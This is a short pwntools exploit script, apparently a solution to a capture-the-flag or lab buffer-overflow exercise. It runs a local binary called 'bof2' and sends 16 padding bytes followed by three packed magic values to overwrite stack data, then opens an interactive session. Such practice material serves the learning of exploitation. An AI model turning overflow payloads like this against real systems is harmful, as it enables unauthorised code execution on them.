from pwn import *

p = process('./bof2')
input()
v = b'a'*16 + p64(0xcafebabe) + p64(0xdeadbeef)  + p64(0x13371337)
p.sendafter(b'>',v)
p.interactive()

